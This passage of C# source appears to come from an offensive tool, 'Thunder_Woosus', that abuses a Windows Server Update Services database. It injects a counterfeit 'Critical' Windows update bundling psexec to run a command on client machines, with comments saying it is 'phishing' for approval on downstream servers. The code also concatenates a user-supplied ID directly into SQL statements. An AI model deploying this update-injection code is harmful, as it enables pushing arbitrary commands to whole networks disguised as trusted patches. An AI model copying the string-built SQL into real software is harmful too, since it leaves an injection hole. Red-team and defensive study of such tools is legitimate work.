        static bool FbDeleteUpdate(SqlCommand sqlCommFun, string sBundleID)
        {
            SqlDataReader sqldrReader;
            sqlCommFun.CommandText = @"exec spDeclineUpdate @updateID='" + sBundleID + "'";
            try
            {
                sqldrReader = sqlCommFun.ExecuteReader();
                sqldrReader.Close();                
            }
            catch
            {
                Console.WriteLine("\r\nFunction error - FbDeleteUpdate: Decline Update.");
                return false;
            }
            sqlCommFun.CommandText = @"exec spDeleteUpdateByUpdateID @updateID='" + sBundleID + "'";
            try
            {
                sqldrReader = sqlCommFun.ExecuteReader();
                sqldrReader.Close();
            }
            catch
            {
                Console.WriteLine("\r\nFunction error - FbDeleteUpdate.");
                return false;
            }
            sqldrReader.Close();
            return true;
        }
        static void Main(string[] args)
        {
            try
            {                
                if(!clCLI.FbCLIInterface(args))
                {
                    return;
                }
                if (clWSUSData.bWSUSInstalled == false)
                {
                    Console.WriteLine("While checking registry it appears WSUS is not installed, stopping execution.");
                    return;
                }                
                SqlCommand sqlComm = new SqlCommand();
                sqlComm.Connection = FsqlConnection();                               
                if (sqlComm.Connection != null)
                {
                    if (clCLI.bEnumComps == true)
                    {
                        FbEnumAllComputers(sqlComm);
                    }
                    if(clCLI.bEnumDS == true)
                    {
                        //Enum DS Servers
                    }
                    if(clCLI.bDeleteUpdate == true)
                    {
                        if (FbDeleteUpdate(sqlComm, clCLI.sBundleGUID) == false)
                        {
                            return;
                        }
                    }                    
                    if (clCLI.bTargetComputer == true || clCLI.bManualApproval == true)
                    {
                        /////
                        //ClFile(filename, local filepath, arguments, copy file to WSUS\Content?, WSUS Content Path)
                        //Todo - Dynamically detect WSUS content path, it's in registry
                        ClFile clFileData = new ClFile("psexec.exe", @"c:\temp\psexec.exe", @"-d -accepteula cmd.exe /c ""c:\windows\system32\calc.exe""", @"C:\program files\update services\WsusContent", true);
                        /////
                        /////
                        //If you're going to use single quotes in title, description, or anywhere below, use two or it won't work correctly
                        //For example, we''re going phishing.
                        /////
                        stUpdateData.sTitle = "Windows Super Awesome Critical Update for Super Fun Times (KB1234567)";
                        stUpdateData.sReleaseDate = @"2018-10-08T17:00:00.000Z";
                        stUpdateData.sClassification = "Critical";
                        stUpdateData.sMSRCNumber = "MS18-123";
                        stUpdateData.sKBNumbers = "1234567";
                        stUpdateData.sDescription = "This update will patch super awesome versions of Windows. We''re phishing for an auto-approval or manual approval on the downstream WSUS servers";
                        //stUpdateData.sProducts = "Windows XP, 2003, 7, 2008(R2), 2012, 10, 2016";
                        stUpdateData.sURL = @"https://ijustwannared.team";
                        /////                    
                        if (!FbGetWSUSConfigSQL(sqlComm))
                        {
                            return;
                        }
                        if (!FbImportUpdate(sqlComm, clFileData))
                        {
                            return;
                        }
                        if (!FbPrepareXMLtoClient(sqlComm, clFileData))
                        {
                            return;
                        }
                        if (!FbInjectUrl2Download(sqlComm, clFileData))
                        {
                            return;
                        }                          
                        if (!FbDeploymentRevision(sqlComm, stUpdateData.iRevisionID))
                        {
                            return;
                        }
                        if (!FbPrepareBundle(sqlComm))
                        {
                            return;
                        }
                        if (!FbPrepareXmlBundleToClient(sqlComm))
                        {
                            return;
                        }                        
                        if (!FbDeploymentRevision(sqlComm, stUpdateData.iRevisionID))
                        {
                            return;
                        }
                        Console.WriteLine("To delete update run the following: Thunder_Woosus.exe -DeleteUpdate {0}", clGuidData.gBundle);                            
                    }                    
                }
                else
                {
                    Console.WriteLine("\r\nSQL Command null");
                }
                sqlComm.Connection.Close();
            }
            catch
            {
                Console.WriteLine("\r\nFunction error - Main.");
            }
        }
    }
}
